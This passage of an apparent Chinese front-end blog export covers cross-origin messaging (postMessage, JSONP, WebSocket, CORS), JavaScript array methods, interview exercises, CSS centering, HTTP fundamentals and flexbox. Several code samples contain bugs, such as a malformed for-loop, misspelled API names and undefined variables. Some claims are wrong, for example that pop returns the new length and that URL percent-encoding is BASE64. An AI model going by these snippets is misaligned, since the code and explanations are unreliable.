(event.origin !== 'http://aaa.com') return; if (event.data === 'Hello World') &#123; event.source.postMessage('Hello', event.origin); &#125; else &#123; console.log(event.data); &#125;&#125; LocalStorage通过window.postMessage，读写其他窗口的 LocalStorage 也成为了可能。下面是一个例子，主窗口写入iframe子窗口的localStorage。 1234567window.onmessage = function(e) &#123;if (e.origin !== 'http://bbb.com') &#123; return;&#125;var payload = JSON.parse(e.data);localStorage.setItem(payload.key, JSON.stringify(payload.data));&#125;; 上面代码中，子窗口将父窗口发来的消息，写入自己的LocalStorage。 父窗口发送消息的代码如下。 123var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = &#123; name: 'Jack' &#125;;win.postMessage(JSON.stringify(&#123;key: 'storage', data: obj&#125;), 'http://bbb.com'); 加强版的子窗口接收消息的代码如下。 1234567891011121314151617window.onmessage = function(e) &#123;if (e.origin !== 'http://bbb.com') return;var payload = JSON.parse(e.data);switch (payload.method) &#123; case 'set': localStorage.setItem(payload.key, JSON.stringify(payload.data)); break; case 'get': var parent = window.parent; var data = localStorage.getItem(payload.key); parent.postMessage(data, 'http://aaa.com'); break; case 'remove': localStorage.removeItem(payload.key); break;&#125;&#125;; 加强版的父窗口发送消息代码如下。 1234567891011var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = &#123; name: 'Jack' &#125;;// 存入对象win.postMessage(JSON.stringify(&#123;key: 'storage', method: 'set', data: obj&#125;), 'http://bbb.com');// 读取对象win.postMessage(JSON.stringify(&#123;key: 'storage', method: "get"&#125;), "*");window.onmessage = function(e) &#123;if (e.origin != 'http://aaa.com') return;// "Jack"console.log(JSON.parse(e.data).name);&#125;; AJAX同源政策规定，AJAX请求只能发给同源的网址，否则就报错。除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。 4.1 JSONP WebSocket CORSJSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。 它的基本思想是，网页通过添加一个&lt;script&gt;元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。 首先，网页动态插入&lt;script&gt;元素，由它向跨源网址发出请求。 1234567891011121314function addScriptTag(src) &#123;var script = document.createElement('script');script.setAttribute("type","text/javascript");script.src = src;document.body.appendChild(script);&#125;window.onload = function () &#123;addScriptTag('http://example.com/ip?callback=foo');&#125;function foo(data) &#123;console.log('Your public IP address is: ' + data.ip);&#125;; 上面代码通过动态添加&lt;script&gt;元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。 123foo(&#123;"ip": "8.8.8.8"&#125;); 由于&lt;script&gt;元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。 4.2 WebSocketWebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自维基百科）。 GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com 上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。 HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat 4.3 CORSCORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http同源策略</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作js数组跟字符的注意点]]></title>
    <url>%2F2018-05-13-Tp.html</url>
    <content type="text"><![CDATA[slice/splice/split区别slice （数组、字符串）① array.slice(start,end);解释：该方法是对数组进行部分截取，并返回一个数组副本；参数start是截取的开始数组索引，end参数等于你要取的最后一个字符的位置值加上1（可选） 1234567// slicevar a = [1,2,3,4,5,6];var b = a.slice(0,3); //[1,2,3]var c = a.slice(3); //[4,5,6]var d = a.slice(-2); //[5,6]var e = a.slice(-7); //[1,2,3,4,5,6]var f = a.slice(9); //[] ② string.slice(start,end);解释：slice方法复制string的一部分来构造一个新的字符串，用法与参数匀和数组的slice方法一样;end参数等于你要取的最后一个字符的位置值加上1 123// slicevar str = 'hi slice'var e = str.slice(2); // slice splice （数组）array.splice(start,deleteCount,item…);解释：splice方法从array中移除一个或多个数组，并用新的item替换它们。参数start是从数组array中移除元素的开始位置。参数deleteCount是要移除的元素的个数。如果有额外的参数，那么item会插入到被移除元素的位置上。它返回一个包含被移除元素的数组。 123//splicevar a = ['a','b','c','d'];var b = a.splice(1,1,'r','t'); // a = ['a','r','t','c','d'] b = ['b'] split （字符串）string.split(separator,limit);解释：split方法把这个string分割成片段来创建一个字符串数组。可选参数limit可以限制被分割的片段数量。separator参数可以是一个字符串或一个正则表达式。如果separator是一个空字符，会返回一个单字符的数组。 123//splitvar a = '2736762687';var b = a.split(''); //b =["2", "7", "3", "6", "7", "6", "2", "6", "8", "7"] a = '2736762687';]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[试题]]></title>
    <url>%2F2018-05-12-test.html</url>
    <content type="text"><![CDATA[试题let\var\const1.const定义的变量不可以修改，而且必须初始化2.var定义的变量可以修改，如果不初始化会输出undefined，不会报错。3.let是块级作用域，函数内部使用let定义后，对函数外部无影响。 魔法币小易准备去魔法王国采购魔法神器,购买魔法神器需要使用魔法币,但是小易现在一枚魔法币都没有,但是小易有两台魔法机器可以通过投入x(x可以为0)个魔法币产生更多的魔法币。魔法机器1:如果投入x个魔法币,魔法机器会将其变为2x+1个魔法币魔法机器2:如果投入x个魔法币,魔法机器会将其变为2x+2个魔法币小易采购魔法神器总共需要n个魔法币,所以小易只能通过两台魔法机器产生恰好n个魔法币,小易需要你帮他设计一个投入方案使他最后恰好拥有n个魔法币。 12345678910111213141516171819var n = parseInt(readline()); //node.js输入var n = 999;var a = [];var flag = true;while (flag) &#123; if(n&gt;2)&#123; if(n%2 == 0)&#123; a.push(2); n = (n-2)/2; &#125;else&#123; a.push(1); n = (n-1)/2 &#125; &#125;else&#123; flag = false; a.push(n); &#125;&#125;console.log(a.reverse().join('')); 函数的参数名与全局变量相同，在函数内调用改变量名是对函数参数的调用，而不是对全局变量的调用1234567var bb = 1;function aa(bb) &#123; bb = 2; alert(bb);&#125;;aa(bb); //2alert(bb); //1 ArrayArray.prototype.shift(); 删除数组的第一个元素，并返回这个元素Array.prototype.unshift();在数组的开头增加一个或者多个元素，并且返回数组的新长度Array.prototype.pop();删除数组的最后一个元素，并返回数组的新长度Array.prototype.push();在数组的末尾增加一个或者多个元素，并且返回数组的新长度Array.prototype.sort();对数组进行排序，并返回该数组Array.prototype.reverse();颠倒数组中元素的排序顺序Array.prototype.splice(); 事件委派123456789101112131415161718192021222324var elements = document.getElementsByTagName('li');var length = elements.length;for(let i=0;i&lt;length;i++)&#123; elements[i].onclick = function()&#123; alert(i); &#125;&#125;&lt;ul&gt; &lt;li&gt;click me&lt;/li&gt; &lt;li&gt;click me&lt;/li&gt; &lt;li&gt;click me&lt;/li&gt; &lt;li&gt;click me&lt;/li&gt;&lt;/ul&gt;var elements = document.getElementsByTagName('li');var length = elements.length;function handle(i)&#123; return function()&#123; alert(i); &#125;&#125;for(let i=0;i&lt;length;i++)&#123;elements[i].onclick = handle(i);&#125; 写一个求和的函数sum，达到下面的效果sum(1, 2, 3, 4, 5);// Should equal 0sum(5, null, -5);// Should equal 10sum(‘1.0’, false, 1, true, 1, ‘A’, 1, ‘B’, 1, ‘C’, 1, ‘D’, 1, ‘E’, 1, ‘F’, 1, ‘G’, 1);// Should equal 0.3, not 0.30000000000000004sum(0.1, 0.2); 1234567function sum()&#123; var result = 0; for(var i=0;l=arguments;i&lt; l;i++)&#123; result+= (!isNaN(arguments[i])&amp;&amp;window.parseFloat(arguments[i])) || 0 &#125; return result.toFixed(3)*1000/1000;&#125; 回文串问题给定一个字符串s，你可以从中删除一些字符，使得剩下的串是一个回文串。如何删除才能使得回文串最长呢？输出需要删除的字符个数。 123456789101112131415161718192021222324252627282930313233343536373839const readline = require('readline');const rl = readline.createInterface(&#123; input:process.stdin, output:process.stdout&#125;);rl.on('line',function(line)&#123; var data = line.trim(); var reverdata = data.split('').reverse().join(''); var len = data.length; console.log(len - dynamic(data,reverdata));&#125;);function dynamic(s1,s2)&#123; var len1=s1.length; var len2=s2.length; var arr=new Array(len1+1); for(var i=0;i&lt;=len1;i++)&#123; arr[i]=new Array(len2+1); console.log(arr); &#125; for(var i=0;i&lt;=len1;i++)&#123; arr[i][0]=0; &#125; for(var j=1;j&lt;=len2;j++)&#123; arr[0][j]=0; &#125; for(var i=1;i&lt;=len1;i++)&#123; for(var j=1;j&lt;=len2;j++)&#123; if(s1[i-1]==s2[j-1])&#123; arr[i][j]=arr[i-1][j-1]+1; &#125;else&#123; arr[i][j]=Math.max(arr[i][j-1],arr[i-1][j]); &#125; &#125; &#125; console.log(arr); return arr[len1][len2];&#125;var a = dynamic('abgad','dagba');console.log(a); 小Q最近遇到了一个难题：把一个字符串的大写字母放到字符串的后面，各个字符的相对位置不变，且不能申请额外的空间。你能帮帮小Q吗？ 123456789101112131415161718192021const readline = require('readline');const rl = readline.creatrInterface(&#123; input:process.stdin, output:process.stdout&#125;);rl.on('line',function(line)&#123; var token = line.split(''); var len = token.length; var p = 0; for(var i=0;i&lt;l-p)&#123; var num = token[i].charCodeAt(0); if(num &lt;= 90)&#123; token.push(tokens[i]); token.splice(i,1); p++ &#125;else&#123; i++ &#125; &#125; console.log(tokens.join(''));&#125;); 去重方法1思路：1.构建一个新的数组存放结果2.for循环中每次从原数组中取出一个元素，用这个元素循环与结果数组对比3.若结果数组中没有该元素，则存到结果数组中 123456789101112131415161718Array.prototype.distinct = function()&#123; var res = [this[0]] for(var i=1;i&lt;this.length;i++)&#123; var repeat = false; for(var j=0;j&lt;res.length;j++)&#123; if(this[i] == res[j])&#123; repeat = true; break; &#125; &#125; if(!repeat)&#123; res.push(this[i]) &#125; &#125; return res;&#125;var arr = [7,1,2,3,1,2,2,2,3,5,6,'a', 'a', 'b', 'd', 'e'];console.log(arr.distinct()); 方法2思路：1.先将原数组进行排序2.检查原数组中的第i个元素 与 结果数组中的最后一个元素是否相同，因 为已经排序，所以重复元素会在相邻位置3.如果不相同，则将该元素存入结果数组中 123456789101112Array.prototype.distinct = function()&#123; this.sort(); var res = [this[0]]; for(var i=1;i&lt;this.length;i++)&#123; if(this[i] !== res[res.length-1])&#123; res.push(this[i]); &#125; &#125; return res;&#125; var arr = [7,1,2,3,1,2,2,2,3,5,6,'a', 'a', 'b', 'd', 'e']; console.log(arr.ditinct()); 方法31.创建一个新的数组存放结果2.创建一个空对象3.for循环时，每次取出一个元素与对象进行对比，如果这个元素不重复，则把它存放到结果数组中，同时把这个元素的内容作为对象的一个属性，并赋值为1，存入到第2步建立的对象中。 12345678910111213Array.prototype.distinct = function()&#123; var res = []; var json = &#123;&#125;; for(var i=0;i&lt;this.length;i++)&#123; if(!json[this[i]])&#123; res.push(this[i]); json[this[i]] = 1; &#125; &#125; return res;&#125;var arr = [7,1,2,3,1,2,2,2,3,5,6,'a', 'a', 'b', 'd', 'e'];console.log(arr.distinct()); 排序大小12345678910111213function mySort() &#123; var tags = new Array(); tags = Array.prototype.slice.call(arguments); console.log(arguments); console.log(arguments.length); console.log(tags); tags.sort(function(pre,next)&#123; return pre - next; &#125;) return tags; &#125;var result = mySort(50,11,16,32,24,99,57,100);console.info(result); 前端开发的优化问题（1） 减少http请求次数：css spirit,data uri （2） JS，CSS源码压缩 （3） 前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数 （4） 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能 （5） 用setTimeout来避免页面失去响应 （6） 用hash-table来优化查找 （7） 当需要设置的样式很多时设置className而不是直接操作style （8） 少用全局变量 （9） 缓存DOM节点查找的结果 （10） 避免使用CSS Expression （11） 图片预载 （12） 避免在页面的主体布局中使用table，table要等其中的内容完全下载之后才会显示出来，显示比div+css布局慢]]></content>
      <categories>
        <category>试题</category>
      </categories>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[水平垂直居中对齐的几种方案]]></title>
    <url>%2F2018-05-11-horizontalVerticalCenter.html</url>
    <content type="text"><![CDATA[水平垂直居中123456789101112&lt;div class="box1"&gt;&lt;/div&gt;&lt;div class="box2"&gt;&lt;/div&gt;&lt;div class="box3"&gt;&lt;/div&gt;&lt;div class="box4"&gt; &lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="box5"&gt; &lt;div class="content"&gt; &lt;div class="inner"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 实现div水平垂直居中的几个方案一、margin:auto实现绝对定位元素的居中，兼容性：ie7之前的版本不适用 1234567891011.box1&#123; width: 200px; height: 200px; background: green; position: absolute; left:0; right: 0; bottom:0; top: 0; margin: auto;&#125; 二、margin负间距 12345678910.box2&#123; width:200px; height: 200px; background:red; position: absolute; left:50%; top:50%; margin-left: -100px; margin-top: -100px;&#125; 三、transforms 变形 兼容性：ie8不支持 123456789.box3&#123; width:200px; height: 200px; background:blue; position: absolute; left:50%; /*定位父级的50%*/ top:50%; transform:translate(-50%,-50%);/*自己的50%*/&#125; 四、css不定宽水平垂直居中（高要设置） 12345678910.box4&#123; display: flex; justify-content: center; align-items: center;&#125;.box4&gt;div&#123; background:#ff9; width: 200px; height: 200px;&#125; 五、table-cell布局table-cell相当与表格的td，td为行内元素，无法设置宽和高，所以嵌套一层，嵌套一层必须设置display: inline-block;td的背景覆盖了橘黄色，不推荐使用 123456789101112131415161718.box5&#123; background-color: #FF8C00;/*橘黄色*/ width: 300px; height: 300px; display: table;&#125;.content&#123; background-color: #F00;/*红色*/ display: table-cell; vertical-align: middle;/*使子元素垂直居中*/ text-align: center;/*使子元素水平居中*/&#125;.inner&#123; background-color: #000;/*黑色*/ display: inline-block; width: 20%; height: 20%;&#125;]]></content>
      <categories>
        <category>界面布局</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http协议]]></title>
    <url>%2F2018-05-11-httpReview.html</url>
    <content type="text"><![CDATA[http协议HTTP协议复习 简介http协议是Hyper Text Transfer Protocol(超文本传输协议)的缩写，是用于从万维网（WWW：World Wide Web）服务器传输超文本到本地浏览器的传送协议。http是一个基于Tcp/ip通信协议来传递数据（HTML文件，图片文件，查询结果等）http是一个属于应用层的面对对象的协议，工作于客户端-服务端架构上，浏览器作为http客户端通过url想http服务端即Web服务器发送所有请求。Web服务器根据接受收到的请求后，向客户端发送相应信息 主要特点1.简单快速：客户向服务器请求服务时，只需传送请求方法和路劲。请求方法常用的有GET、Head、Post。每种方法规定了客户与服务器联系的类型不同，由于http协议简单，使得http服务器的程序规模小，因而通信速度很快。2.灵活：http运行传输任意类型的数据对象，正在传输的类型由Content-Type加以标记3.无连接：无连接的含义是限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。4.无状态：http是无状态协议。无状态是指协议对于事务处理没有记忆能力，缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大，另一方面，在服务器不需要先前信息时它的应答就比较快5.支持B\S以及C\S HTTP之URLhttp使用统一资源标识符（uniform resource Identifier，URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息。URL全称是UniformResourceLocator，中文名叫做统一资源定义符，是互联网上用来标识某一处资源的地址，以下面这个URL为例，介绍URL的各部分组成http://www.baidu.com:8080/news/index.asp?id=5&amp;count=100#name一个完整的URL包括以下几个部分1.协议部分：该url协议部分为“http:”,这代表了网页使用的http协议，在Internet中可以使用多种协议，如http、ftp等。上例使用的是http协议，在http后面的“//“”为分隔符2.域名部分:该url的域名部分为“www.baidu.com”，一个url也可以使用ip地址作为域名使用3.端口部分：跟在域名后面的是端口，域名与端口之间使用“:”作为分割符，端口不是一个url必须的部分，如果忽略端口部分，将采用默认端口4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分，虚拟目录也不是一个url必须的部分，上例中虚拟部分是“/news/”5.文件名部分：从域名的最后一个“/”开始到“?”为止，就是文件名部分，如果没有“?”，则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“?”和“#”，那么就从域名后的最后一个“/”开始到结束，都是文件名的部分。上例中的文件名是“index.asp”。文件名部分也不是一个url必须的部分，如果忽略该部分，则使用默认的文件名。7.参数部分：从“?”开始到“#”为止之间的部分都是参数，又称为搜索部分，查询部分。上例中参数部分为“id=5&amp;count=100”，多个参数间用“&amp;”隔开 http请求之消息requset客户端发送一个http请求到服务器的请求消息包括以下格式：请求行（request line）\请求头部（header）\空行、请求数据四个部分组成 Get请求例子，使用Charles抓取的request：GET /562f25980001b1b106000338.jpg HTTP/1.1Host img.mukewang.comUser-Agent Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36Accept image/webp,image/,/*;q=0.8Referer http://www.imooc.com/Accept-Encoding gzip, deflate, sdchAccept-Language zh-CN,zh;q=0.8 1.请求行，用来说明请求类型，要访问的资源以及使用的http版本请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。例子中GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。2.请求头部，紧接着请求行之后的部分，用来说明服务器要使用的附加信息从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等3.空行，请求头部后面空行是必须的即使第四部分的请求数据为空，也必须有空行。4.请求数据也叫主体，可以添加任意的其他数据get例子的请求数据为空 POST请求例子，使用Charles抓取的request：POST / HTTP1.1Host:www.wrox.comUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)Content-Type:application/x-www-form-urlencodedContent-Length:40Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 1.请求行，第一行明了是post请求，以及http1.1版本。2.请求头部，第二行至第六行。3.空行，第七行的空行。4.请求数据，第八行。 http之响应消息responsehttp响应也由四个部分组成，分别是状态行、消息报头空行和响应正文。 例子 HTTP/1.1 200 OKDate: Fri, 22 May 2009 06:07:21 GMTContent-Type: text/html; charset=UTF-8 &lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;!--body goes here--&gt; &lt;/body&gt; &lt;/html&gt; 1.状态行，由http协议版本号，状态码，状态消息三部分组成。第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）2.消息报头，用来说明客户端要使用的一些附加信息第二行和第三行为消息报头，Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-83.空行，消息报头后面的空行是必须的4.响应正文，服务器返回给客户端的文本信息。空行后面的html部分为响应正文。 Request：请求行+请求头部+空行+请求数据Response：状态行+消息报头+空行+响应正文 http之状态码1xx：指示信息–表示请求已接收，继续处理2xx：成功–表示请求已被成功接收、理解、接受3xx：重定向–要完成请求必须进行更进一步的操作4xx：客户端错误–请求有语法错误或请求无法实现5xx：服务器端错误–服务器未能实现合法的请求 常见状态码： 200 OK //客户端请求成功400 Bad Request //客户端请求有语法错误，不能被服务器所理解401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用403 Forbidden //服务器收到请求，但是拒绝提供服务404 Not Found //请求资源不存在，eg：输入了错误的URL500 Internal Server Error //服务器发生不可预期的错误503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 http请求方法根据HTTP标准，HTTP请求可以使用多种请求方法。HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。 GET 请求指定的页面信息，并返回实体主体。HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。PUT 从客户端向服务器传送的数据取代指定的文档的内容。DELETE 请求服务器删除指定的页面。CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。OPTIONS 允许客户端查看服务器的性能。TRACE 回显服务器收到的请求，主要用于测试或诊断。 http工作原理HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。 以下是 HTTP 请求/响应的步骤：1.客户端连接到web服务器一个http客户端，通常是浏览器，与web服务器的http端口（默认为80）建立一个tcp套接字连接2.发送http请求通过tcp套接字，客户端向Web服务端发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成3.服务器接受请求并返回http响应.Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取，一个响应由状态行，响应头部，空行，响应正文组成。4.释放tcp连接，若connection模式为close，则服务器主动关闭tcp连接，客户端被动关闭连接，释放tcp连接，若connection模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接受请求。5.客户端浏览器解析html内容。客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。 例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程： 1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址; 2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接; 3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器; 4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器; 5、释放 TCP连接; 6、浏览器将该 html 文本并显示内容; GET和POST请求的区别GET请求GET /books/?sex=man&amp;name=Professional HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Connection: Keep-Alive注意最后一行是空行 POST请求POST / HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 40Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。 POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中强调标明的就是实际的传输数据因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变 2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。而在实际开发中存在的限制主要有：GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。因此对于GET提交时，传输数据就会受到URL长度的 限制。POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。 3、安全性 POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击 4、Http get,post,soap协议都是在http上运行的（1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全（2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。（3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为: text/xml 任何数据都可以xml化。Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. 我们看看GET和POST的区别 GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中.GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flex布局重温]]></title>
    <url>%2F2018-05-10-flexReview.html</url>
    <content type="text"><![CDATA[flex布局重温 flex布局重温flex布局重温一、Flex是什么Flex布局是Flexible Box 的缩写。意为“弹性布局”，为盒装模型提供最大的灵活性，任何一个容器都可以指定为Flex布局。 123.box&#123; display:flex;&#125; 行内元素也可以使用Flex布局 123.box&#123; display:inline-box;&#125; Webkit内核的浏览器，必须加上 -webkit 前缀 1234.box&#123; display:-webkit-flex;/*Safair*/ display:flex;&#125; 注意设为Flex布局以后，子元素的 float、clear、vertical-align 属性将失效 二、基本概念采用Flex布局的元素，称为Flex容器（flex container）,简称“容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item）,简称“项目”。容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置与边框的交叉点叫做 main start ，结束位置叫做 main end；交叉轴的开始位置叫做 cross start,结束位置叫做 cross end。项目默认沿主轴排列。单个项目占据的主轴空间 main size，占据的交叉轴空间叫做 cross size 三、容器的属性▶ flex-direction▶ flex-wrap▶ flex-flow▶ justify-content▶ align-items▶ align-content 3.1 flex-direction属性flex-direction 属性决定主轴的方向（即项目的排列方向） 123.box&#123; flex-direction:row | row-reverse | column | column-reverse;&#125; ▪ row: 主轴为水平方向，起点在左端▪ row-reverse: 主轴为水平方向，起点在右端▪ column : 主轴为垂直方向，起点在上沿▪ column-reverse : 主轴为垂直方向，起点在下沿▪ row: 主轴为水平方向，起点在左端 3.2 flex-wrap属性默认情况下，所有的项目都排在一条线（又称“轴线”）上。flex-wrap 属性定义，如果一条轴线排不下，如何换行。 123.box&#123; flex-wrap:nowrap | wrap | wrap-reverse&#125; ▪ nowrap:不换行▪ wrap:换行，第一行在上方▪ wrap-reverse:换行，第一行在下方 3.3 flex-flowflex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap 123.box&#123; flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;&#125; 3.4 justify-content属性justify-content 属性定义了项目在主轴上的对齐方式 123box&#123; justify-content:flex-start | flex-end | center | space-between | space-around;&#125; ▪ flex-start:左对齐▪ flex-end:右对齐▪ center:居中▪ space-between:两端对齐，项目之间的间隔都相等▪ space-around:每个项目两侧的间隔相等，所以，项目之间的间隔比项目与边框的间隔大一倍 3.5 align-items属性align-items属性定义项目在交叉轴上如何对齐 123.box&#123; align-item:flex-start | flex-end | center | baseline | stretch&#125; ▪ flex-start:交叉轴的起点对齐▪ flex-end:交叉轴的终点对齐▪ center:交叉轴的中点对齐▪ baseline:项目的第一行文字的基线对齐▪ stretch:如果项目未设置高度或设为auto，将占满整个容器的高度 3.6 align-content属性align-content 属性定义了多根轴线的对齐方式，如果项目只有一条轴线，该属性不起作用。 123.box&#123; align-content:flex-start | flex-end | center | space-between |space-around | stretch;&#125; ▪ flex-start:交叉轴的起点对齐▪ flex-end:交叉轴的终点对齐▪ center:交叉轴的中点对齐▪ space-between:与交叉轴两端对齐，轴线之间的间隔平均分布▪ 